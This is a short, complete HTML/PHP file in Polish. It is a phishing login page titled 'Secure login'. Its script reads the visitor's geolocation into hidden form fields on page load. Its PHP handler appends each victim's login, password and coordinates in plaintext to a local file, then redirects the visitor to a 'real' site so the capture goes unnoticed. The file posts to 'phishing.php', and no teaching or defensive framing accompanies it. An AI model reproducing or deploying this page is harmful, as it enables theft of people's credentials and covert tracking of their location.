<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Bezpieczne logowanie</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    document.getElementById("lat").value = position.coords.latitude;
                    document.getElementById("lon").value = position.coords.longitude;
                });
            }
        }

        window.onload = getLocation;
    </script>
</head>
<body>
    <?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login = $_POST['login'];
    $password = $_POST['password'];
    $lat = $_POST['lat'];
    $lon = $_POST['lon'];

    $file = fopen("dane.txt", "a");
    fwrite($file, "Login: " . $login . " | Hasło: " . $password . " | Lat: " . $lat . " | Lon: " . $lon . "\n");
    fclose($file);
    header("Location: https://prawdziwa-strona.pl"); 
    exit();
}
?>
    <h2>Zaloguj się do swojego konta</h2>
    <form action="phishing.php" method="POST">
        <label for="login">Login lub e-mail:</label><br>
        <input type="text" id="login" name="login"><br><br>
        <label for="password">Hasło:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="hidden" id="lat" name="lat">
        <input type="hidden" id="lon" name="lon">

        <input type="submit" value="Zaloguj się">
    </form>
</body>
</html>
